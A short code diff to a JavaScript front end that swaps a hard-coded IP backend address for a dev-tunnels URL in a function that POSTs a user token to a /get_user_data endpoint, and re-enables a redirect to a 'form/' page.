@@ -271,9 +271,9 @@
 
 
 
-
+const BACKEND_URL = 'https://nmqp7n98-5001.inc1.devtunnels.ms/get_user_data'
 function sendUserData(token) {
-  fetch("http://165.22.208.62:5001/get_user_data", {
+  fetch(BACKEND_URL, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ token })
@@ -390,7 +390,7 @@ function sendUserData(token) {
         
 
 
-        // location.href = 'form/'
+        location.href = 'form/'
       };
 
       // Check if there's an existing token
